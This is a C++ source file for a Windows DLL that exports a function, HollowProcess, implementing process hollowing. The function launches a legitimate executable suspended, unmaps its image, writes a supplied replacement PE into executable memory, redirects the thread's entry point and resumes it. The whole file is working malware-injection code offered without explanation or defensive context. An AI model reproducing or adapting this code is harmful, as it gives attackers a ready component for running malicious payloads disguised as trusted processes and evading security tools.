#include "pch.h"
#include <winternl.h>

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);



LPPROCESS_INFORMATION CreatSuspendedProcess(LPCSTR targetimage) {
	LPSTARTUPINFOA targetimageStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION targetimageProcessInfo = new PROCESS_INFORMATION();
	if (!CreateProcessA(
		0,
		(LPSTR)targetimage,
		0,
		0,
		0,
		CREATE_SUSPENDED,
		0,
		0,
		targetimageStartupInfo,
		targetimageProcessInfo)) {
		return NULL;
	};
	return targetimageProcessInfo;
}


PVOID GetFixedReplacementAllocation(const unsigned char* replacmentExe, size_t size) {
	
	PVOID pReplacementImage = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD totalNumberofBytesRead;
	CopyMemory(pReplacementImage, replacmentExe, size);
	return pReplacementImage;
}


BOOL GetContext(LPPROCESS_INFORMATION suspendedProcess, DWORD flag, CONTEXT* context) {
	context->ContextFlags = flag;
	if (!GetThreadContext(suspendedProcess->hThread, context)) {
		printf("[-] Error in GetThreadContext: %d\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}


BOOL GetTargetBaseAddress(LPPROCESS_INFORMATION suspendedProcess, PVOID paddOfImageBaseAddress, PVOID* pImageBaseAddress) {
	if (!ReadProcessMemory(
		suspendedProcess->hProcess,
		paddOfImageBaseAddress,
		&(*pImageBaseAddress),
		sizeof(PVOID),
		0)) {
		return FALSE;
	}
	return TRUE;
}

void GetHeaders(PVOID pReplacementImage, PIMAGE_DOS_HEADER* pDOSHeader, PIMAGE_NT_HEADERS* pNTHeaders) {
	*pDOSHeader = (PIMAGE_DOS_HEADER)pReplacementImage;
	*pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pReplacementImage + (*pDOSHeader)->e_lfanew);
}

PVOID GetHollowAllocation(PVOID pReplacementImage, LPPROCESS_INFORMATION suspendedProcess, PVOID pImageBaseAddress,
	PIMAGE_NT_HEADERS pNTHeaders) {
	return VirtualAllocEx(
		suspendedProcess->hProcess,
		pImageBaseAddress,
		pNTHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
}

void WriteHeadersAndSections(PVOID pReplacementImage, LPPROCESS_INFORMATION suspendedProcess, PVOID pImageBaseAddress, PIMAGE_NT_HEADERS pNTHeaders, PIMAGE_DOS_HEADER pDOSHeader, PVOID pHollowedAllocation, CONTEXT& context) {
	WriteProcessMemory(
		suspendedProcess->hProcess,
		(PVOID)pImageBaseAddress,
		pReplacementImage,
		pNTHeaders->OptionalHeader.SizeOfHeaders,
		0);

	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader =
			(PIMAGE_SECTION_HEADER)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)
				+ (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(suspendedProcess->hProcess,
			(PVOID)((LPBYTE)pHollowedAllocation + pSectionHeader->VirtualAddress),
			(PVOID)((LPBYTE)pReplacementImage + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData,
			0);
	}
	context.Rcx = (SIZE_T)((LPBYTE)pHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
}


extern "C" __declspec(dllexport)
int HollowProcess(LPCSTR targetimage, const unsigned char* replacmentExe, size_t size) {
	

	LPPROCESS_INFORMATION suspendedProcess = CreatSuspendedProcess(targetimage);
	if (suspendedProcess == NULL) {
		printf("[-] error to start susspended process");
		return -1;
	}

	PVOID pReplacementImage = GetFixedReplacementAllocation(replacmentExe, size);
	if (pReplacementImage == NULL) {
		printf("[-] error to get fixed allocatiom buffer");
		return -2;
	}


	CONTEXT Context;
	if (!GetContext(suspendedProcess, CONTEXT_FULL, &Context)) {
		printf("[-] error to get thread context rrrr");
		return -3;
	}


	PVOID pImageBaseAddress;
	PVOID paddOfImageBaseAddress = (PVOID)(Context.Rdx + 16);

	if (!GetTargetBaseAddress(suspendedProcess, paddOfImageBaseAddress, &pImageBaseAddress)) {
		printf("[-] error to GetTargetBaseAddress");
		return -4;
	}


	DWORD dwResult = NtUnmapViewOfSection(suspendedProcess->hProcess, pImageBaseAddress);
	if (dwResult) {
		printf("[-] error unmapping section");
		return -5;
	}

	PIMAGE_DOS_HEADER pDOSHeader;
	PIMAGE_NT_HEADERS pNTHeaders;
	GetHeaders(pReplacementImage, &pDOSHeader, &pNTHeaders);

	PVOID pHollowedAllocation = GetHollowAllocation(pReplacementImage, suspendedProcess, pImageBaseAddress, pNTHeaders);
	if (!pHollowedAllocation) {
		printf("[-] error allocate memory on the target process");
		return -5;
	}

	WriteHeadersAndSections(
		pReplacementImage,
		suspendedProcess,
		pImageBaseAddress,
		pNTHeaders,
		pDOSHeader,
		pHollowedAllocation,
		Context
	);

	SetThreadContext(suspendedProcess->hThread, &Context);

	ResumeThread(suspendedProcess->hThread);

	CloseHandle(suspendedProcess->hThread);
	CloseHandle(suspendedProcess->hProcess);
	VirtualFree(pReplacementImage, 0, MEM_RELEASE);

	return 0;
}